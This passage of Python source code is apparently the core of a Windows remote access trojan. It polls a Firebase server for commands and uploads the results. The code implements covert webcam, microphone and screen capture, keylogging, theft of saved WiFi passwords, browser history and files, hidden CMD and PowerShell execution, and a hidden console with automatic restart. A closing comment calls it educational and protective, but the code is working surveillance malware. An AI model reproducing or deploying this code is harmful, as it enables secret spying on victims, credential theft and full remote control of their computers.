    def start_heartbeat(self):
        def loop():
            while self.running:
                time.sleep(self.heartbeat_interval)
                self.send_heartbeat()
        threading.Thread(target=loop, daemon=True).start()

    def get_commands(self):
        try:
            r = self.session.get(self._w(f"commands/{self.device_id}"), timeout=10)
            if r.status_code == 200:
                return r.json() or {}
            return {}
        except: return {}

    def mark_command_done(self, command_id):
        try:
            self.session.delete(self._w(f"commands/{self.device_id}/{command_id}"), timeout=10)
        except: pass

    # ─────────────────────────────────────────
    #  DOWNLOAD FILE
    # ─────────────────────────────────────────

    def download_file(self, file_path):
        try:
            file_path = os.path.expandvars(os.path.expanduser(file_path))
            if os.path.exists(file_path):
                if os.path.getsize(file_path) > 50 * 1024 * 1024:
                    return {"error": "File too large (max 50MB)"}
                with open(file_path, 'rb') as f:
                    content = base64.b64encode(f.read()).decode('utf-8')
                return {"filename": os.path.basename(file_path), "content": content,
                        "size_kb": round(len(content)/1024, 2), "path": file_path, "type": "file"}
            return {"error": f"File not found: {file_path}", "type": "error"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    # ─────────────────────────────────────────
    #  EXECUTE COMMAND
    # ─────────────────────────────────────────

    def execute_command(self, command):
        try:
            original_command = command.strip().strip('\r\n\t')
            command = original_command.lower().strip()

            if not command:
                return {"error": "Empty command", "type": "error"}

            if command == "/screenshot":
                return self.take_screenshot()
            elif command == "/webcam":
                return self.get_webcam_image()
            elif command in ("/fullinfo", "/info"):
                return self.get_full_system_info()
            elif command.startswith("/mic "):
                parts = command.split()
                if len(parts) == 2:
                    try:
                        d = int(parts[1])
                        if 1 <= d <= 300:
                            return self.capture_microphone(d)
                        return {"error": "Duration must be 1-300", "type": "error"}
                    except:
                        return {"error": "Invalid duration", "type": "error"}
                return self.capture_microphone()
            elif command == "/mic":
                return self.capture_microphone()
            elif command.startswith("/micduration "):
                parts = command.split()
                if len(parts) == 2:
                    return self.audio_capture.set_duration(parts[1])
                return {"error": "Usage: /micduration [seconds]"}
            elif command.startswith("/video "):
                parts = command.split()
                dur = int(parts[1]) if len(parts) > 1 else 15
                return self.record_video(dur)
            elif command == "/video":
                return self.record_video(15)
            elif command.startswith("/play_video "):
                video_id = original_command[12:].strip()
                return self.play_video_from_firebase(video_id)
            elif command == "/keylog on":
                return self.enable_keylogging()
            elif command == "/keylog off":
                return self.disable_keylogging()
            elif command == "/keylogs":
                return self.get_keylogs()
            elif command == "/keylog clear":
                return self.clear_keylogs()
            elif command.startswith("/delete_audio "):
                return self.delete_audio(command[14:].strip())
            elif command.startswith("/delete_capture "):
                return self.delete_capture(command[16:].strip())
            elif command == "/location":
                return self.get_location()
            elif command == "/basicinfo":
                return self.get_system_info()
            elif command == "/network":
                return self.get_network_info()
            elif command == "/wifi":
                wifi = self.get_network_info().get('wifi_networks', [])
                return {"networks": wifi, "count": len(wifi), "type": "wifi"}
            elif command == "/wifipass":
                return self.get_wifi_passwords()
            elif command == "/apps":
                return self.get_active_apps()
            elif command == "/clipboard":
                return self.get_clipboard()
            elif command.startswith("/setclip "):
                return self.set_clipboard(original_command[9:])
            elif command == "/env":
                return self.get_environment_vars()
            elif command == "/drives":
                return self.get_drives_info()
            elif command.startswith("/taskkill "):
                return self.kill_task(command[10:].strip())
            elif command == "/syslog":
                return self.get_system_events()
            elif command == "/installed":
                return self.get_installed_software()
            elif command == "/startup":
                return self.get_startup_items()
            elif command == "/browser_history":
                return self.get_browser_history()
            elif command.startswith("/screenshot_auto"):
                parts = command.split()
                interval = int(parts[1]) if len(parts) > 1 else 10
                count = int(parts[2]) if len(parts) > 2 else 5
                return self.screenshot_auto(interval, count)
            elif command == "/recent":
                return self.get_recent_files()
            elif command.startswith("/open "):
                return self.open_target(original_command[6:].strip())
            elif command.startswith("/url "):
                return self.open_target(original_command[5:].strip())
            elif command.startswith("/wallpaper "):
                return self.set_wallpaper(original_command[11:].strip())
            elif command.startswith("/display "):
                return self.display_on_screen(original_command[9:])
            elif command == "/display_clear":
                return self.clear_screen_display()
            elif command.startswith("/msg "):
                msg = original_command[5:]
                _run(f"msg * {msg}", shell=True)
                return {"status": "message", "message": f"Message sent: {msg}"}
            elif command.startswith("/download "):
                return self.download_file(original_command[10:].strip())
            elif command == "/shutdown":
                _run("shutdown /s /t 10", shell=True)
                return {"status": "shutdown", "message": "Shutting down in 10s..."}
            elif command == "/restart":
                _run("shutdown /r /t 10", shell=True)
                return {"status": "restart", "message": "Restarting in 10s..."}
            elif command == "/lock":
                ctypes.windll.user32.LockWorkStation()
                return {"status": "lock", "message": "Workstation locked"}
            elif command == "/logout":
                threading.Thread(target=lambda: (time.sleep(1), _run("shutdown /l /f", shell=True)), daemon=True).start()
                return {"status": "logout", "message": "Logging out..."}
            elif command.startswith("/cmd "):
                try:
                    r = _run(original_command[5:], shell=True, timeout=30)
                    return {"stdout": r.stdout, "stderr": r.stderr, "code": r.returncode, "type": "cmd"}
                except subprocess.TimeoutExpired:
                    return {"error": "Command timed out", "type": "error"}
            elif command.startswith("/ps "):
                try:
                    r = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
                              "-Command", original_command[4:]], timeout=30)
                    return {"stdout": r.stdout, "stderr": r.stderr, "code": r.returncode, "type": "powershell"}
                except subprocess.TimeoutExpired:
                    return {"error": "PowerShell timed out", "type": "error"}
            elif command == "/help":
                return {
                    "commands": [
                        "/screenshot - Take screenshot",
                        "/webcam - Capture webcam photo",
                        "/video [seconds] - Record video (max 20s, default 15s)",
                        "/play_video [id] - Play recorded video fullscreen",
                        "/fullinfo - Complete A-Z system details",
                        "/basicinfo - Basic system info",
                        "/mic [seconds] - Record microphone (default 30s)",
                        "/keylog on/off/clear - Control input tracker",
                        "/keylogs - Get input history",
                        "/delete_capture [id] - Delete any capture from Firebase",
                        "/location - Get geolocation",
                        "/network - Network details",
                        "/wifi - Scan WiFi networks",
                        "/wifipass - Get saved WiFi passwords",
                        "/apps - List active applications",
                        "/clipboard - Get clipboard text",
                        "/setclip [text] - Set clipboard text",
                        "/env - Get environment variables",
                        "/drives - Get all drive details",
                        "/taskkill [name/pid] - Kill process",
                        "/syslog - Windows Event Log",
                        "/browser_history - Chrome/Edge/Brave/Firefox history",
                        "/installed - List installed software",
                        "/startup - List startup programs",
                        "/screenshot_auto [interval] [count] - Auto screenshots",
                        "/recent - Recently accessed files",
                        "/open [url/app] - Open URL or app",
                        "/url [url] - Open URL in browser",
                        "/wallpaper [url] - Set desktop wallpaper from URL",
                        "/display [text] - Broadcast text as PNG to screen (saves to Documents)",
                        "/display_clear - Remove broadcast — deletes PNG and JSON",
                        "/download [path] - Download file as base64",
                        "/lock - Lock workstation",
                        "/logout - Log out user",
                        "/restart - Restart system",
                        "/shutdown - Shutdown system",
                        "/msg [text] - Show message popup",
                        "/cmd [command] - Run CMD command (silent)",
                        "/ps [command] - Run PowerShell command (silent)"
                    ],
                    "type": "help"
                }
            elif command.startswith("/"):
                return {"error": f"Unknown command: {command}. Type /help for list.", "type": "error"}
            else:
                try:
                    r = _run(original_command, shell=True, timeout=30)
                    return {"stdout": r.stdout, "stderr": r.stderr, "code": r.returncode, "type": "command"}
                except subprocess.TimeoutExpired:
                    return {"error": "Command timed out", "type": "error"}
        except Exception as e:
            return {"error": str(e), "type": "error"}

    # ─────────────────────────────────────────
    #  SYNC LOOP
    # ─────────────────────────────────────────

    def sync_loop(self):
        consecutive_errors = 0
        while self.running:
            try:
                self.system_info = self.get_system_info()
                self.send_to_firebase(f"pcs/{self.device_id}/info", self.system_info)
                commands = self.get_commands()
                if commands:
                    for cmd_id, cmd_data in commands.items():
                        if cmd_id not in self.commands_processed:
                            command = cmd_data.get("command", "")
                            result = self.execute_command(command)
                            result_data = {
                                "command": command,
                                "result": result,
                                "timestamp": datetime.datetime.now().isoformat(),
                                "device_id": self.device_id,
                                "hostname": platform.node()
                            }
                            self.send_to_firebase(f"pcs/{self.device_id}/results/{cmd_id}", result_data)
                            # Store captures separately
                            cmd_lower = command.lower().strip()
                            if result:
                                if cmd_lower == "/screenshot" and "image" in result:
                                    cid = f"ss_{int(time.time())}"
                                    self.send_to_firebase(f"pcs/{self.device_id}/captures/{cid}", result)
                                elif cmd_lower == "/webcam" and "image" in result:
                                    cid = f"wc_{int(time.time())}"
                                    self.send_to_firebase(f"pcs/{self.device_id}/captures/{cid}", result)
                                elif cmd_lower.startswith("/video") and "video" in result:
                                    vid_id = result.get("video_id", f"vid_{int(time.time())}")
                                    self.send_to_firebase(f"pcs/{self.device_id}/captures/{vid_id}", result)
                            self.commands_processed.add(cmd_id)
                            self.mark_command_done(cmd_id)

                # ── Check broadcast node (HTML panel sends here) ──
                try:
                    r = self.session.get(self._w(f"broadcast/{self.device_id}"), timeout=8)
                    if r.status_code == 200:
                        data = r.json()
                        if data and isinstance(data, dict):
                            text = data.get("text", "").strip()
                            if text and text != SyncManager._display_text:
                                # New broadcast → call display_on_screen (handles everything)
                                self.display_on_screen(text)
                            elif (not text) and SyncManager._display_active:
                                self.clear_screen_display()
                        elif data is None and SyncManager._display_active:
                            self.clear_screen_display()
                except: pass

                consecutive_errors = 0
                sleep_time = 3 if self.online_status else 5
                time.sleep(sleep_time)
            except Exception:
                consecutive_errors += 1
                wait = min(consecutive_errors * 2, 30)
                time.sleep(wait)


# ─────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────
def main():
    # Keep running forever — restart on any crash
    while True:
        try:
            monitor = SyncManager()
            monitor.sync_loop()
        except Exception:
            time.sleep(10)
            continue


if __name__ == "__main__":
    # Hide only the console window — never touch user foreground window
    try:
        _hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if _hwnd:
            ctypes.windll.user32.ShowWindow(_hwnd, 0)
    except: pass
    main()
    


    # Made by kakarotbd
    # Made only for educational purposes. Do not use it for anything harmful or illegal, otherwise you may face cybercrime charges.
    # This program was created solely to help keep your PC or laptop safe.
    # Keep an eye on my GitHub repository for more updates.
    # Version 1.0 still contains several bugs, and I hope to fix them as soon as possible.
